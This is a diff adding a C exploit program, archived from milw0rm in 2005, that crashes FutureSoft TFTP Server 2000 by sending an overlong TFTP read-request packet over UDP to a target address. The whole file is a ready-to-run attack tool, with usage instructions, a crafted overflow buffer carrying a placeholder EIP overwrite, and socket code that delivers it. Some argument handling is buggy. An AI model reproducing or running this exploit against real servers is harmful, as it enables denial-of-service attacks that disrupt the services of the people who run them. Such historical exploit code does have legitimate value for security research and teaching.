@@ -1,0 +1,115 @@
+/*
+*
+* FutureSoft TFTP Server 2000 Remote Denial of Service Exploit
+* http://www.futuresoft.com/products/lit-tftp2000.htm
+* Bug Discovered by SIG^2 (http://www.security.org.sg)
+* Exploit coded By ATmaCA
+* Web: atmacasoft.com && spyinstructors.com
+* E-Mail: atmaca@icqmail.com
+* Credit to kozan
+* Usage:tftp_exp <targetIp> [targetPort]
+*
+*/
+
+/*
+*
+* Vulnerable Versions:
+* TFTP Server 2000 Evaluation Version 1.0.0.1
+*
+*/
+
+#include <windows.h>
+#include <stdio.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+/* |RRQ|AAAAAAAAAAAAAAAA....|NULL|netasc|NULL| */
+char expbuffer[] =
+"\x00\x01"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x58\x58\x58\x58" /* EIP */
+"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
+"\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x00\x00\x6E\x65\x74\x61\x73\x63\x69"
+"\x69\x00";
+
+void main(int argc, char *argv[])
+{
+        WSADATA wsaData;
+        WORD wVersionRequested;
+        struct hostent *pTarget;
+        struct sockaddr_in sock;
+        SOCKET mysocket;
+        int destPORT = 69;//Default to 69
+
+        if (argc < 2){
+                printf("FutureSoft TFTP Server 2000 Remote Denial of Service Exploit\n");
+                printf("http://www.futuresoft.com/products/lit-tftp2000.htm\n");
+                printf("Bug Discovered by SIG^2 (http://www.security.org.sg)\n");
+                printf("Exploit coded By ATmaCA\n");
+                printf("Web: atmacasoft.com && spyinstructors.com\n");
+                printf("E-Mail: atmaca@icqmail.com\n");
+                printf("Credit to kozan\n");
+                printf("Usage:tftp_exp <targetIp> [targetPort]\n");
+                return;
+        }
+        if (argc==3)
+                destPORT=atoi(argv[2]);
+
+        printf("Requesting Winsock...\n");
+        wVersionRequested = MAKEWORD(1, 1);
+        if (WSAStartup(wVersionRequested, &wsaData) < 0) {
+                printf("No winsock suitable version found!");
+                return;
+        }
+        mysocket = socket(AF_INET, SOCK_DGRAM	, 0);
+        if(mysocket==INVALID_SOCKET){
+                printf("Can't create UDP socket\n");
+                exit(1);
+        }
+        printf("Resolving Hostnames...\n");
+        if ((pTarget = gethostbyname(argv[2])) == NULL){
+                printf("Resolve of %s failed\n", argv[1]);
+                exit(1);
+        }
+        memcpy(&sock.sin_addr.s_addr, pTarget->h_addr, pTarget->h_length);
+        sock.sin_family = AF_INET;
+        sock.sin_port = htons(destPORT);
+
+        printf("Connecting...\n");
+        if ( (connect(mysocket, (struct sockaddr *)&sock, sizeof (sock) ))){
+                printf("Couldn't connect to host.\n");
+                exit(1);
+        }
+
+        printf("Connected!...\n");
+        Sleep(10);
+
+        printf("RRQ->Sending packet. Size: %d\n",sizeof(expbuffer));
+        if (send(mysocket,expbuffer, sizeof(expbuffer)+1, 0) == -1){
+                printf("Error sending packet\n");
+                closesocket(mysocket);
+                exit(1);
+        }
+        printf("Packet sent........\n");
+        printf("Success.\n");
+
+        closesocket(mysocket);
+        WSACleanup();
+}
+
+// milw0rm.com [2005-06-02]
